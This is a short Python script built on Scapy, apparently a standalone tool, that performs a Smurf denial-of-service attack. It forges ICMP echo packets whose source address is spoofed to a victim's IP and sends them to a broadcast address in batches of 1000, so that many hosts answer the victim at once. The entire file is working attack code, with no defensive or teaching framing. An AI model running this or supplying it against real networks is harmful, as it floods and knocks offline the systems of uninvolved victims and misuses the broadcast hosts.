import sys
from scapy.all import IP, ICMP, send

def forge_source_ip(ip_broadcast, source_ip):
    packet = IP(dst=ip_broadcast)/ICMP()
    packet[IP].src = source_ip
    return packet

if __name__ == '__main__':
    if len(sys.argv) == 1 :
        print("Usage: smurf_attack <Target IP> <Requests number> <Broadcast IP>")
        exit()
    values = sys.argv
    forged_packet = forge_source_ip(values[3], values[1])
    packet_batch = [forged_packet] * 1000
    for x in range (int(values[2]) // 1000) :
        send(packet_batch, verbose=0)
